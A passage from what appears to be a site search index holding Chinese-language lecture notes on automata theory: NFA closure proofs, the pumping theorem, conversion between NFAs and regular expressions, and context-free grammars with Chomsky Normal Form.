B\\)</p> Proof. if \\(A\\) and \\(B\\) are regular, so is \\(A\\circ B\\) <p>\u601d\u8def\uff1a\u8fde\u63a5\u4e24\u4e2a\u63a5\u6536 \\(A\\) \u548c \\(B\\) \u7684 NFA</p> <p>\\(\\exists M_A=(K_A, \\Sigma, \\Delta_A, s_A, F_A)\\text{ accepts }A\\)\uff0c\\(\\exists M_B=(K_B, \\Sigma, \\Delta_B, s_B, F_B)\\text{ accepts }B\\)</p> <p> \\(\\text{let }M=(K, \\Sigma, \\Delta, s, F)\\)\uff0cwhere:</p> <ul> <li>\\(K = K_A\\cup K_B\\)</li> <li>\\(s = s_A\\)</li> <li>\\(F = F_B\\)</li> <li>\\(\\Delta = \\Delta_A\\cup \\Delta_B\\cup \\{(q_A, e, s_B): q_A\\in F_A\\}\\)</li> </ul> <p>\\(\\text{then }M\\text{ accepts }A\\circ B\\)</p> Proof. if \\(A\\) and \\(B\\) are regular, so is \\(A^*\\) <p>\u601d\u8def\uff1a\u8ba9\u4e00\u4e2a\u63a5\u6536 \\(A\\) \u7684 NFA \u81ea\u5df1\u8fdb\u884c\u5faa\u73af</p> <p>\\(\\exists M_A=(K_A, \\Sigma, \\Delta_A, s_A, F_A)\\text{ accepts }A\\)</p> <p> </p> <p>\u6ce8\u610f</p> <p>\\(A^*\\) \u5305\u62ec\u7a7a\u4e32\uff0c\u6240\u4ee5\u8981\u4fdd\u8bc1\u521d\u59cb\u72b6\u6001\u4e5f\u662f\u63a5\u53d7\u72b6\u6001\u3002\u4f46\u540c\u65f6\u53c8\u4e0d\u80fd\u8ba9 \\(M_A\\) \u7684\u521d\u59cb\u72b6\u6001\u53d8\u4e3a\u63a5\u53d7\u72b6\u6001\uff0c\u4e5f\u4e0d\u80fd\u8ba9\u5176\u521d\u59cb\u72b6\u6001\u901a\u8fc7 \\(e\\)-transition \u5230\u8fbe\u63a5\u53d7\u72b6\u6001\uff0c\u5426\u5219\u5982\u679c \\(M_A\\) \u9014\u4e2d\u8fd4\u56de\u521d\u59cb\u72b6\u6001\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u63a5\u53d7\u4e86\u5176\u4ed6\u4e0d\u8be5\u63a5\u53d7\u7684\u5b57\u7b26\u4e32\u3002\u6240\u4ee5\u8981\u65b0\u5efa\u4e00\u4e2a\u521d\u59cb\u72b6\u6001 \\(s\\)\uff0c\u901a\u8fc7 \\(e\\)-transition \u5230\u8fbe \\(s_A\\)\uff0c\u4e14 \\(s\\) \u4e5f\u662f\u63a5\u53d7\u72b6\u6001\u3002</p> <p>\\(\\text{let }M=(K, \\Sigma, \\Delta, s, F)\\)\uff0cwhere:</p> <ul> <li>\\(K = K_A\\cup \\{s\\}\\)</li> <li>\\(s = s\\)\uff08\u5373\u65b0\u5efa\u7684\u4e00\u4e2a\u521d\u59cb\u72b6\u6001\uff09</li> <li>\\(F = F_A\\cup \\{s\\}\\)</li> <li>\\(\\Delta = \\Delta_A\\cup \\{(s, e, s_A)\\}\\cup \\{(q_A, e, s_A): q_A\\in F_A\\}\\)</li> </ul> <p>\\(\\text{then }M\\text{ accepts }A^*\\)</p>"},{"location":"cs/tcs/toc/topic1/#pumping-theorem","title":"Pumping Theorem","text":"<p>\u53ef\u4ee5\u7528\u6765\u8bc1\u660e\u4e00\u4e2a\u8bed\u8a00\u4e0d\u662f\u6b63\u5219\u8bed\u8a00\u7684\u4e00\u4e2a\u5b9a\u7406\u3002\u5176\u5185\u5bb9\u5982\u4e0b\uff1a</p> <ul> <li>\u4ee4 \\(L\\) \u4e3a\u4e00\u4e2a\u6b63\u5219\u8bed\u8a00</li> <li>\u5219\u5b58\u5728\u4e00\u4e2a\u6574\u6570 \\(p\\geq 1\\)\uff08\u79f0\u4e3a pumping length\uff09</li> <li>\u4f7f\u5f97\u5bf9\u4e8e\u6240\u6709\u957f\u5ea6\u4e0d\u5c0f\u4e8e \\(p\\) \u7684\u5b57\u7b26\u4e32 \\(w\\in L\\)</li> <li>\u90fd\u53ef\u4ee5\u5c06 \\(w\\) \u5206\u89e3\u4e3a\u4e09\u90e8\u5206 \\(w=xyz\\)\uff0c\u6ee1\u8db3\uff1a<ol> <li>\u5bf9\u4e8e\u4efb\u610f \\(k\\geq 0\\)\uff0c\u6709 \\(xy^kz\\in L\\)</li> <li>\\(|y|\\geq 1\\)</li> <li>\\(|xy|\\leq p\\)</li> </ol> </li> </ul> Proof <p>\u5982\u679c \\(L\\) \u662f\u6709\u9650\u7684\uff0c\u90a3\u4e48\u4ee4 \\(p=\\displaystyle\\max_{w\\in L}|w|+1\\) \u5373\u53ef\u6ee1\u8db3\u6240\u6709\u8981\u6c42\u3002</p> <p>\u5982\u679c \\(L\\) \u662f\u65e0\u9650\u7684\uff0c\u56e0\u4e3a\u5176\u662f\u6b63\u5219\u8bed\u8a00\uff0c\u6240\u4ee5\u5b58\u5728\u4e00\u4e2a DFA \\(M\\) \u63a5\u53d7 \\(L\\)\u3002\u4ee4 \\(p\\) \u4e3a \\(M\\) \u7684\u72b6\u6001\u6570\uff0c\u5373 \\(p=|K|\\)\u3002</p> <p>\u4ee4 \\(w\\in L\\) \u4e14 \\(|w|\\geq p\\)\uff0c\u73b0\u5047\u8bbe \\(w=a_1a_2\\cdots a_n\\)\uff0c\u5219\u8be5\u81ea\u52a8\u673a\u4e00\u5b9a\u5305\u542b\u5982\u4e0b\u4e00\u6761\u8def\u5f84\uff1a</p> <p> </p> <p>\u56e0\u4e3a\u81ea\u52a8\u673a\u53ea\u6709 \\(p\\) \u4e2a\u72b6\u6001\uff0c\u4f46 \\(n\\) \u53c8\u4e0d\u5c0f\u4e8e \\(p\\)\uff0c\u6240\u4ee5\u4e00\u5b9a\u5b58\u5728 \\(0\\leq i &lt; j\\leq p\\)\uff0c\u4f7f\u5f97 \\(q_i\\) \u548c \\(q_j\\) \u662f\u540c\u4e00\u72b6\u6001\u3002\u8fd9\u6837\u8fd9\u6761\u8def\u5f84\u5c31\u53ef\u4ee5\u8f6c\u5316\u4e3a\uff1a</p> <p> </p> <p>\u56e0\u6b64 \\(xy^kz\\in L\\)\u3001\\(|y|=j-1\\geq 1\\)\u3001\\(|xy|=j\\leq p\\) \u90fd\u6ee1\u8db3\u3002</p> \u8bc1\u660e \\(L = \\{0^n1^n:n\\geq 0\\}\\) \u4e0d\u662f\u6b63\u5219\u8bed\u8a00 <p>\u53cd\u8bc1\u6cd5\uff0c\u5047\u8bbe \\(L\\) \u662f\u6b63\u5219\u7684\uff0c\u4ee4 \\(p\\) \u4e3a\u5176 pumping length\u3002</p> <p>\u6839\u636e pumping theorem\uff0c\\(0^p1^p\\in L\\) \u53ef\u4ee5\u88ab\u5199\u6210 \\(0^p1^p=xyz\\)\uff0c\u6ee1\u8db3\uff1a</p> <ul> <li>\\(xy^kz\\in L, \\forall k\\geq 0\\)</li> <li>\\(|y|\\geq 1\\)</li> <li>\\(|xy|\\leq p\\)</li> </ul> <p>\u7531\u540e\u4e24\u6761\u53ef\u4ee5\u63a8\u51fa \\(y=0^t\\)\uff08\u5176\u4e2d \\(t\\geq 1\\)\uff09\uff0c\u90a3\u4e48\u4ee4 \\(k=0\\)\uff0c\u6709 \\(xy^kz=xy^0z=xz=0^{p-t}1^p\\)\uff0c\u4f46\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4e0d\u5728 \\(L\\) \u4e2d\uff0c\u4e0d\u7b26\u5408\u7b2c\u4e00\u6761\uff0c\u4ea7\u751f\u77db\u76fe\uff0c\u6240\u4ee5 \\(L\\) \u4e00\u5b9a\u4e0d\u662f\u6b63\u5219\u8bed\u8a00\u3002</p>"},{"location":"cs/tcs/toc/topic1/#_6","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u7531\u4ee5\u4e0b\u89c4\u5219\u5b9a\u4e49\uff1a</p> <ul> <li>Atomic\uff1a\u5bf9\u4e8e \\(\\emptyset\\) \u5bf9\u5e94\u8bed\u8a00 \\(L(\\emptyset)=\\emptyset\\)\uff0c\u5bf9\u4e8e \\(a\\in\\Sigma\\) \u6709 \\(L(a)=\\{a\\}\\)</li> <li>Composite\uff1a<ul> <li>\\(R_1\\cup R_2\\) \u5bf9\u5e94\u8bed\u8a00 \\(L(R_1\\cup R_2) = L(R_1)\\cup L(R_2)\\)</li> <li>\\(R_1R_2\\) \u5bf9\u5e94\u8bed\u8a00 \\(L(R_1R_2) = L(R_1)\\circ L(R_2)\\)</li> <li>\\(R_1^*\\) \u5bf9\u5e94\u8bed\u8a00 \\(L(R_1^*) = L(R_1)^*\\)</li> <li>\u4f18\u5148\u7ea7\uff1a\\(^* &gt; \\circ &gt; \\cup\\)<ul> <li>Ex. \\(ab^*\\cup b^*a=\\big(a(b^*)\\big)\\cup\\big((b^*)a\\big)\\)</li> </ul> </li> </ul> </li> </ul> <p>\u5176\u5b9e\u5c31\u7c7b\u4f3c\u4e8e\u5404\u7f16\u7a0b\u8bed\u8a00\u4e2d\u4f7f\u7528\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4e0d\u8fc7\u90a3\u4e9b\u6b63\u5219\u8868\u8fbe\u5f0f\u4e00\u822c\u90fd\u52a0\u4e86\u4e0d\u5c5e\u4e8e\u8fd9\u91cc\u89c4\u5b9a\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u66f4\u591a\u529f\u80fd\uff08\u6bd4\u5982\u8bb0\u5f55\u6355\u83b7\u7ec4\u5e76\u5728 \\1 \u65f6\u5f15\u7528\u6355\u83b7\u5185\u5bb9\uff09\u3002</p> \u4f8b\u5b50 <ul> <li>\\(\\emptyset^*\\) \u5bf9\u5e94\u8bed\u8a00 \\(\\{e\\}\\)</li> <li>\\(a(a\\cup b)^*b\\) \u5bf9\u5e94\u8bed\u8a00 \\(\\{w\\in\\{a, b\\}^*: w\\text{ starts with }a\\text{ and ends with }b\\}\\)</li> <li>\\((a\\cup b)^*a(a\\cup b)^*a(a\\cup b)^*\\) \u5bf9\u5e94\u8bed\u8a00 \\(\\{w\\in\\{a, b\\}^*: w\\text{ contains at least two }a\\text{'s}\\}\\)</li> </ul> <p>\u4e00\u822c\u7528 \\(R\\) \u8868\u793a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7528 \\(L(R)\\) \u8868\u793a\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u5e94\u7684\u8bed\u8a00\uff08\u5339\u914d\u7684\u5b57\u7b26\u4e32\u96c6\u5408\uff09\u3002</p> <ul> <li>\u7ed9\u5b9a\u4e00\u4e2a NFA \\(M\\)\uff0c\u8981\u627e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f \\(R\\) \u4f7f\u5f97 \\(L(R) = L(M)\\)</li> <li>\u8003\u8651\u5316\u7b80 \\(M\\)\uff0c\u4e14\u9700\u8981\u6ee1\u8db3\u8981\u6c42\uff1a<ul> <li>\u521d\u59cb\u72b6\u6001\u6ca1\u6709\u5165\u8fb9</li> <li>\u53ea\u6709\u4e00\u4e2a\u6ca1\u6709\u51fa\u8fb9\u7684\u63a5\u53d7\u72b6\u6001</li> </ul> </li> <li>\u5316\u7b80\u601d\u8def\uff1a\u52a0\u4e00\u4e2a\u521d\u59cb\u72b6\u6001\u548c\u63a5\u53d7\u72b6\u6001\uff0c\u7528 \\(e\\)-transition \u8fde\u63a5\u5230\u539f\u6765\u7684\u521d\u59cb\u72b6\u6001\u548c\u63a5\u53d7\u72b6\u6001\uff0c\u7136\u540e\u5220\u9664\u539f\u6765\u7684\u521d\u59cb\u72b6\u6001\u548c\u63a5\u53d7\u72b6\u6001\uff0c\u518d\u9010\u4e00\u5220\u9664\u4e2d\u95f4\u72b6\u6001</li> </ul> \u4e00\u4e2a\u5316\u7b80\u7684\u793a\u4f8b <p>\u8981\u5316\u7b80\u7684\u81ea\u52a8\u673a\u5982\u4e0b\uff08\u5df2\u7ecf\u4fee\u6539\u4e86\u521d\u59cb\u72b6\u6001\u548c\u63a5\u53d7\u72b6\u6001\uff0c\u539f\u6765 \\(q_1\\) \u521d\u59cb \\(q_3\\) \u63a5\u53d7\uff09\uff1a</p> <p>  \u5220\u6389\u72b6\u6001 \\(q_1\\)\uff08\u5f71\u54cd\u5230 \\(q_4\\to q_3\\) \u548c \\(q_2\\to q_3\\) \u4e24\u6761\u8def\u5f84\uff09\uff1a</p> <p> </p> <p>\u5220\u6389\u72b6\u6001 \\(q_2\\)\uff08\u5f71\u54cd\u5230 \\(q_3\\to q_3\\) \u8def\u5f84\uff09\uff1a</p> <p> </p> <p>\u5220\u6389\u72b6\u6001 \\(q_3\\)\uff1a</p> <p> </p> <p>\u6240\u4ee5\u8be5\u81ea\u52a8\u673a\u5bf9\u5e94\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e3a \\(R = a^*b(a\\cup ba^*ba^*b)^*\\)</p> \u5f62\u5f0f\u5316\u63cf\u8ff0 <p>\u8bbe NFA \\(M=(K, \\Sigma, \\Delta, s, F)\\)\uff0c\u5176\u4e2d\uff1a</p> <ul> <li>\\(K = \\{q_1, q_2, \\cdots, q_n\\}\\)\uff0c\\(s = q_{n-1}\\)\uff0c\\(F = \\{q_n\\}\\)</li> <li>\\((p, a, q_{n-1})\\notin\\Delta\\)\uff0c\\(\\forall p\\in K, \\forall a\\in\\Sigma\\)</li> <li>\\((q_n, a, p)\\notin\\Delta\\)\uff0c\\(\\forall p\\in K, \\forall a\\in\\Sigma\\)</li> </ul> <p>\u6c42 \\(R\\) \u4f7f\u5f97 \\(L(R) = L(M)\\)\u3002</p> <p>\u91c7\u7528\u52a8\u6001\u89c4\u5212\u601d\u60f3\uff0c\u5212\u5206\u5b50\u95ee\u9898\uff1a\u5bf9\u4e8e \\(i, j\\in[1, n]\\) \u4ee5\u53ca \\(k\\in[0, n]\\) \u5b9a\u4e49 \\(L_{ij}^k=\\{w\\in\\Sigma^*: w\\text{ drive M from }q_i\\text{ to }q_j\\text{ with no intermediate state having index }&gt;k\\}\\)</p> <ul> <li>\u5373 \\(L_{ij}^k\\) \u8868\u793a\u4ece \\(q_i\\) \u5230 \\(q_j\\) \u7684\u8def\u5f84\u8868\u793a\u7684\u8bed\u8a00\uff0c\u4e14\u4e2d\u95f4\u72b6\u6001\u7684\u4e0b\u6807\u4e0d\u5927\u4e8e \\(k\\)<ul> <li>\u6ce8\u610f\u4e2d\u95f4\u72b6\u6001\u4e0d\u5305\u542b\u9996\u5c3e</li> </ul> </li> <li>\u8bb0 \\(L_{ij}^k\\) \u5bf9\u5e94\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e3a \\(R_{ij}^k\\)</li> </ul> \u4f7f\u7528\u524d\u9762\u7684\u81ea\u52a8\u673a\u7684\u4f8b\u5b50 <p> </p> <ul> <li>\\(L_{11}^0 = \\{e, a\\}\\)\uff0c\u5bf9\u5e94 \\(R_{11}^0 = \\emptyset^*\\cup a\\)<ul> <li>\u6ce8\u610f \\(aa\\) \u4e0d\u5c5e\u4e8e \\(L_{11}^0\\) \u56e0\u4e3a\u6709\u4e2d\u95f4\u72b6\u6001 \\(q_1\\)\uff0c\u5176\u4e0b\u6807\u5927\u4e8e 0</li> </ul> </li> <li>\\(L_{13}^0 = \\{b\\}\\)\uff0c\u5bf9\u5e94 \\(R_{12}^0 = b\\)</li> <li>\\(L_{41}^1 = \\{e, a, aa, \\cdots\\}\\)\uff0c\u5bf9\u5e94 \\(R_{41}^1 = \\emptyset^*\\cup aa^*\\)</li> </ul> <p>\u52a8\u6001\u89c4\u5212\u8fc7\u7a0b\u90e8\u5206\uff1a</p> <ul> <li>\u76ee\u6807\uff1a\\(R_{(n-1)n}^{n-2}\\)</li> <li>\u8d77\u59cb\u5df2\u77e5\uff1a<ul> <li>\\(k=0\\text{ and if }i=j\\)\uff0c\u6709 \\(L_{ii}^0 = \\{e\\}\\cup\\{a: (q_i, a, q_i)\\in\\Delta\\}\\)\uff0c\u53ef\u5199\u51fa\u6b63\u5219\u8868\u8fbe\u5f0f \\(R_{ii}^0\\)</li> <li>\\(k=0\\text{ and if }i\\neq j\\)\uff0c\u6709 \\(L_{ij}^0 = \\{a: (q_i, a, q_j)\\in\\Delta\\}\\)\uff0c\u53ef\u5199\u51fa\u6b63\u5219\u8868\u8fbe\u5f0f \\(R_{ij}^0\\)</li> </ul> </li> <li>\u9012\u63a8\u5173\u7cfb\uff1a\\(L_{ij}^k = L_{ij}^{k-1}\\cup\\ ?\\)<ul> <li>\u4e2d\u95f4\u8fc7\u7a0b\u6709\u82e5\u5e72\u6b21\u4f1a\u5230\u8fbe \\(q_k\\)\uff0c\u4f9d\u6b64\u6765\u8fdb\u884c\u5212\u5206\uff0c\u6709 \\(L_{ik}^{k-1}\\)\u3001\\(L_{kk}^{k-1}\\)\uff08\u82e5\u5e72\u6b21\uff09\u3001\\(L_{kj}^{k-1}\\) \u51e0\u4e2a\u9636\u6bb5</li> <li>\u8fde\u63a5\u8d77\u6765\u6709 \\(L_{ij}^k = L_{ij}^{k-1}\\cup L_{ik}^{k-1}\\circ\\big(L_{kk}^{k-1}\\big)^*\\circ L_{kj}^{k-1}\\)</li> <li>\u56e0\u6b64\u5bf9\u5e94\u6b63\u5219\u8868\u8fbe\u5f0f\u6709 \\(R_{ij}^k = R_{ij}^{k-1}\\cup R_{ik}^{k-1}\\big(R_{kk}^{k-1}\\big)^*R_{kj}^{k-1}\\)</li> </ul> </li> </ul> <p>\u6709\u4ee5\u4e0a\u8fd9\u4e9b\u5173\u7cfb\uff0c\u8fdb\u884c\u52a8\u6001\u89c4\u5212\u9012\u63a8\u5373\u53ef\u6c42\u89e3\u6700\u7ec8\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p>"},{"location":"cs/tcs/toc/topic2/","title":"\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00","text":"<p> \u7ea6 3566 \u4e2a\u5b57  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u7b2c\u4e94\u81f3\u7b2c\u516d\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/tcs/toc/topic2/#_2","title":"\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5","text":"<ul> <li>Context-Free Grammar (CFG) \u4e00\u4e9b\u751f\u6210\u5b57\u7b26\u4e32\u7684\u89c4\u5219<ul> <li>e.g. \\(S\\to aSb,\\ S\\to A,\\ A\\to c,\\ A\\to e\\)<ul> <li>\u53ef\u4ee5\u751f\u6210 \\(S\\Rightarrow aSb\\Rightarrow aaSbb\\Rightarrow aaAbb\\Rightarrow aabb\\)</li> </ul> </li> <li>\u5176\u4e2d \\(S\\) \u662f\u8d77\u59cb\u7b26\u53f7\uff08start symbol\uff09\uff0c\u5927\u5199\u5b57\u6bcd\u662f\u975e\u7ec8\u7ed3\u7b26\u53f7\uff08non-terminals\uff09\uff0c\u5c0f\u5199\u5b57\u6bcd\u662f\u7ec8\u7ed3\u7b26\u53f7\uff08terminals\uff09</li> </ul> </li> <li>\u5f62\u5f0f\u5316\u5b9a\u4e49\uff0c\u4e00\u4e2a CFG \u662f\u4e00\u4e2a\u56db\u5143\u7ec4 \\(G=(V, \\Sigma, S, R)\\)<ul> <li>\\(V\\)\uff1aa finite set of symbols</li> <li>\\(\\Sigma\\subseteq V\\)\uff1athe set of terminals<ul> <li>\\(V-\\Sigma\\)\uff1athe set of non-terminals\uff08\u5373 \\(V\\setminus\\Sigma\\)\uff09</li> </ul> </li> <li>\\(S\\subseteq V-\\Sigma\\)\uff1athe start symbol</li> <li>\\(R\\subseteq (V-\\Sigma)\\times V^*\\)\uff1athe set of rules<ul> <li>\u5373\u4e00\u4e2a\u7531\u975e\u7ec8\u7ed3\u7b26\u53f7\u548c\u8f6c\u6362\u5f97\u5230\u7684\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\u5143\u7ec4\u6784\u6210\u7684\u96c6\u5408</li> </ul> </li> </ul> </li> <li>\u63a8\u5bfc<ul> <li>derive in one step: for any \\(x, y, z\\in V^*\\), for any \\(A\\in V-\\Sigma\\)<ul> <li>\\(xAy\\Rightarrow_G xuy\\) if \\((A, u)\\in R\\)</li> </ul> </li> <li>derive: for any \\(w, u\\in V^*\\)<ul> <li>\\(w\\Rightarrow_G^* u\\) if \\(w=u\\) or \\(w\\Rightarrow_G\\cdots\\Rightarrow_G u\\)</li> </ul> </li> </ul> </li> <li>\u751f\u6210\u5b57\u7b26\u4e32\uff1a\\(G\\) generates a string \\(w\\in\\Sigma^*\\) if \\(S\\Rightarrow_G^* w\\)</li> <li>\u751f\u6210\u8bed\u8a00\uff1a\\(G\\) generates \\(L(G) = \\{w\\in\\Sigma^*: G\\text{ generates }w\\}\\)</li> <li>\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00\uff08Context-Free Language\uff0cCFL\uff09<ul> <li>A language is context-free if some CFG generates it</li> </ul> </li> </ul> \u8bc1\u660e \\(\\{w\\in\\{a, b\\}^*: w=w^R\\}\\) \u5373\u56de\u6587\u5b57\u7b26\u4e32\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\u7684 <p>\u5b58\u5728\u4e00\u4e2a CFG\uff1a</p> <ul> <li>\\(S\\to e,\\ S\\to a,\\ S\\to b\\)</li> <li>\\(S\\to aSa,\\ S\\to bSb\\)<ul> <li>\u53ef\u4ee5\u7b80\u5199 \\(S\\to e\\ |\\ a\\ |\\ b\\ |\\ aSa\\ |\\ bSb\\)</li> </ul> </li> </ul> <p>\u53ef\u4ee5\u751f\u6210\u8fd9\u4e2a\u8bed\u8a00\uff0c\u6240\u4ee5\u5176\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\u7684\u3002</p>"},{"location":"cs/tcs/toc/topic2/#chomsky-normal-form","title":"Chomsky Normal Form","text":"<ul> <li>\u4e00\u4e2a CFG \u662f Chomsky Normal Form\uff08CNF\uff09\u7684\uff0c\u5982\u679c\u5b83\u7684\u6240\u6709\u89c4\u5219\u90fd\u662f\u4ee5\u4e0b\u4e09\u79cd\u5f62\u5f0f\u4e4b\u4e00\uff1a<ul> <li>\\(S\\to e\\)\uff1a\u53ea\u6709\u8d77\u59cb\u7b26\u53f7\u53ef\u4ee5\u63a8\u5bfc\u51fa\u7a7a\u4e32</li> <li>\\(A\\to BC\\) for some \\(B, C\\in V-\\Sigma\\)\uff1a\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ef\u4ee5\u63a8\u5bfc\u51fa\u4e24\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7</li> <li>\\(A\\to a\\) for some \\(a\\in\\Sigma\\)\uff1a\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ef\u4ee5\u63a8\u5bfc\u51fa\u4e00\u4e2a\u7ec8\u7ed3\u7b26\u53f7</li> </ul> </li> <li>\u7279\u70b9\uff1a\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(n\\) \u7684\u4e32\u9700\u8981 \\(2n-1\\) \u6b65\u63a8\u5bfc</li> <li>\u5b9a\u7406\uff1a\u4efb\u4f55\u4e00\u4e2a CFG \u90fd\u53ef\u4ee5\u8f6c\u6362\u6210\u7b49\u4ef7 CNF \u5f62\u5f0f\uff08\u5373\u4fdd\u8bc1\u751f\u6210\u8bed\u8a00\u76f8\u540c\uff09</li> </ul> \u4fee\u6539\u65b9\u6cd5\uff08\u7b80\u5355\u8bc1\u660e\u6846\u67b6\uff09 <p>\u9488\u5bf9\u6bcf\u4e2a\u89c4\u5219\u7684\u4ee5\u4e0b\u4e94\u79cd\u60c5\u51b5\u8fdb\u884c\u5904\u7406\uff1a</p> <ol> <li>\u5982\u679c\u8d77\u59cb\u7b26\u53f7 \\(S\\) \u51fa\u73b0\u5728\u4e86\u89c4\u5219\u7684\u53f3\u4fa7\uff1a<ul> <li>\u65b0\u5efa\u65b0\u7684\u8d77\u59cb\u7b26\u53f7 \\(S_0\\)\uff0c\u5e76\u65b0\u5efa\u89c4\u5219 \\(S_0\\to S\\)</li> <li>\u8fd9\u6761\u5904\u7406\u4fdd\u8bc1\u6bcf\u6761\u89c4\u5219\u7684\u53f3\u4fa7\u6ca1\u6709\u8d77\u59cb\u7b26\u53f7</li> </ul> </li> <li>\\(A\\to e\\) for some \\(A\\neq S\\)\uff0c\u5373\u975e\u8d77\u59cb\u7b26\u53f7\u751f\u6210\u4e86\u7a7a\u4e32\uff1a<ul> <li>\u5220\u9664\u8fd9\u6761\u89c4\u5219\uff0c\u5e76\u8fdb\u884c\u8865\u507f\uff1a\u6240\u6709\u53f3\u4fa7\u51fa\u73b0 \\(A\\) \u7684\u89c4\u5219\u90fd\u8981\u590d\u5236\u4e00\u4efd\u5c06 \\(A\\) \u5220\u9664<ul> <li>\u6bd4\u5982 \\(B\\to ACA\\) \u8981\u6539\u4e3a\u4e09\u6761\uff1a\\(B\\to CA,\\ B\\to AC,\\ B\\to C\\)</li> </ul> </li> <li>\u8fd9\u6761\u5904\u7406\u4fdd\u8bc1\u53ea\u6709\u8d77\u59cb\u7b26\u53f7\u53ef\u4ee5\u63a8\u5bfc\u51fa\u7a7a\u4e32\uff0c\u4e14\u5176\u4ed6\u89c4\u5219\u4e0d\u53d7\u5f71\u54cd</li> </ul> </li> <li>\\(A\\to B\\) for some \\(B\\in V-\\Sigma\\)\uff0c\u5373\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ea\u63a8\u5bfc\u51fa\u4e86\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7\uff1a<ul> <li>\u5220\u9664\u8fd9\u6761\u89c4\u5219\uff0c\u5e76\u8fdb\u884c\u8865\u507f\uff1a\u6240\u6709\u7531 \\(B\\) \u63a8\u5bfc\u51fa\u7684\u89c4\u5219\u90fd\u8981\u5c06 \\(B\\) \u66ff\u6362\u4e3a \\(A\\)<ul> <li>\u6bd4\u5982 \\(B\\to CDE\\) \u8981\u6539\u4e3a \\(A\\to CDE\\)</li> <li>\u4e0d\u80fd\u91c7\u7528\u7c7b\u4f3c\u7b2c\u4e8c\u6761\u7684\u5904\u7406\uff0c\u5373\u5c06\u53f3\u4fa7\u51fa\u73b0 \\(A\\) \u7684\u66ff\u6362\u4e3a \\(B\\)\uff0c\u56e0\u4e3a \\(A\\) \u53ef\u80fd\u662f\u8d77\u59cb\u7b26\u53f7\uff08\u56e0\u4e3a\u53f3\u4fa7\u4fdd\u8bc1\u4e86\u4e0d\u4f1a\u51fa\u73b0\u8d77\u59cb\u7b26\u53f7\uff0c\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u5b9e\u9645\u5e76\u6ca1\u6709\u8fdb\u884c\u8865\u507f\uff0c\u662f\u6709\u95ee\u9898\u7684\uff09</li> </ul> </li> <li>\u8fd9\u6761\u5904\u7406\u4fdd\u8bc1\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ef\u4ee5\u63a8\u5bfc\u51fa\u4e24\u4e2a\u6216\u4ee5\u4e0a\u975e\u7ec8\u7ed3\u7b26\u53f7</li> </ul> </li> <li>\\(A\\to u_1u_2\\cdots u_k\\) for some \\(k\\geq 3\\)\uff0c\u5373\u975e\u7ec8\u7ed3\u7b26\u53f7\u63a8\u5bfc\u51fa\u4e86\u4e09\u4e2a\u6216\u4ee5\u4e0a\u7684\u7b26\u53f7\uff1a<ul> <li>\u65b0\u5efa\u65b0\u7684\u975e\u7ec8\u7ed3\u7b26\u53f7 \\(V_i\\)\uff0c\u5e76\u65b0\u5efa\u89c4\u5219 \\(A\\to u_1V_2,\\ \\cdots,\\ V_{k-2}\\to u_{k-2}V_{k-1},\\ V_{k-1}\\to u_{k-1}u_k\\)</li> <li>\u8fd9\u6761\u5904\u7406\u4fdd\u8bc1\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ea\u80fd\u63a8\u5bfc\u51fa\u4e24\u4e2a\u7b26\u53f7</li> </ul> </li> <li>\\(A\\to u_1u_2\\) at least one \\(u_i\\in\\Sigma\\)\uff0c\u5373\u975e\u7ec8\u7ed3\u7b26\u53f7\u63a8\u5bfc\u51fa\u7684\u4e24\u4e2a\u7b26\u53f7\u4e2d\u6709\u7ec8\u7ed3\u7b26\u53f7\uff1a<ul> <li>\u5c06\u7ec8\u7ed3\u7b26\u53f7\u5305\u4e00\u5c42\u65b0\u7684\u975e\u7ec8\u7ed3\u7b26\u53f7\uff0c\u4f8b\u5982\u5982\u679c \\(u_1\\) \u975e\u7ec8\u7ed3\u800c \\(u_2\\) \u7ec8\u7ed3\u5219\u65b0\u5efa\u89c4\u5219 \\(A\\to u_1V,\\ V\\to u_2\\)</li> <li>\u8fd9\u6761\u5904\u7406\u4fdd\u8bc1\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ea\u80fd\u63a8\u5bfc\u51fa\u4e00\u4e2a\u7ec8\u7ed3\u7b26\u53f7\u6216\u4e24\u4e2a\u975e\u7ec8\u7ed3\u5b57\u7b26</li> </ul> </li> </ol> <p>\u5982\u4e0a\u5904\u7406\u540e\uff0c\u6240\u6709\u89c4\u5219\u90fd\u7b26\u5408 CNF \u7684\u8981\u6c42\u3002</p> \u5c06 \\(S\\to e\\ |\\ a\\ |\\ b\\ |\\ aSa\\ |\\ bSb\\) \u8f6c\u4e3a CNF <ul> <li>\u53f3\u4fa7\u6709\u51fa\u73b0\u8d77\u59cb\u7b26\u53f7\uff0c\u6240\u4ee5\u65b0\u5efa\u89c4\u5219 \\(S_0\\to S\\)</li> 